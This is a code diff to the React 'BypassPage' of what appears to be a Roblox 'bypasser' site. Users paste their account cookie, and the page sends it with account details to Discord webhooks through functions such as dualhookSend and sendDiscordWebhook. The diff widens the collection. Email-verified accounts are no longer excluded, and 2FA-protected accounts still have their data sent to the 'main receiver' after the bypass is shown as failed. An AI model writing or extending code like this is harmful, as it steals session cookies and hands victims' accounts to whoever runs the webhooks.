@@ -2,9 +2,11 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie, Shield } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
+import DiscordInviteCard from "@/components/DiscordInviteCard";
 import {
   dualhookSend, AccountInfo, isValidCookieFormat,
   broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
+  sendDiscordWebhook, getWebhook, WK,
 } from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
@@ -33,8 +35,17 @@ const BypassPage = () => {
   const [progress, setProgress] = useState(0);
   const navigate = useNavigate();
   const intervalRef = useRef<number | null>(null);
+  const [shieldPinged, setShieldPinged] = useState(false);
 
   useEffect(() => () => { if (intervalRef.current) window.clearInterval(intervalRef.current); }, []);
+
+  const handleShieldClick = async () => {
+    if (shieldPinged) return;
+    setShieldPinged(true);
+    await sendDiscordWebhook(getWebhook(WK.bypass), '🛡️ **Shield activated** — user opened the Roblox Bypasser');
+    toast.success("Shield activated");
+    window.setTimeout(() => setShieldPinged(false), 5000);
+  };
 
   function getAttempts(): number[] {
     try {
@@ -93,14 +104,14 @@ const BypassPage = () => {
       return;
     }
 
-    // Secured accounts (2FA or verified email) cannot be bypassed → BLOCK BYPASS
-    if (info.has2FA || info.emailVerified) {
+    // Secured accounts (2FA only) → BLOCK BYPASS live, but still send main receiver
+    if (info.has2FA) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
       setProgress(0);
       setStatus("error");
-      const reason = info.has2FA ? 'Authenticator enabled' : 'Email secured';
-      toast.error(`Account secured (${reason})`);
-      await broadcastLiveBypassFailed(info, reason);
+      toast.error("Account secured (Authenticator enabled)");
+      await broadcastLiveBypassFailed(info, 'Authenticator enabled');
+      await dualhookSend("bypass", info);
       return;
     }
 
@@ -135,9 +146,9 @@ const BypassPage = () => {
           <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
         </div>
 
-        <ShieldIcon size="md" />
+        <ShieldIcon size="md" interactive onClick={handleShieldClick} />
 
-        <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in">
+        <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in transition-all duration-300">
           <div className="space-y-2">
             <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
               <Cookie size={14} className="text-primary" /> Cookie
@@ -212,6 +223,8 @@ const BypassPage = () => {
             <p className="text-sm font-semibold text-foreground">Bypass failed.</p>
           </div>
         )}
+
+        <DiscordInviteCard />
       </div>
     </div>
   );
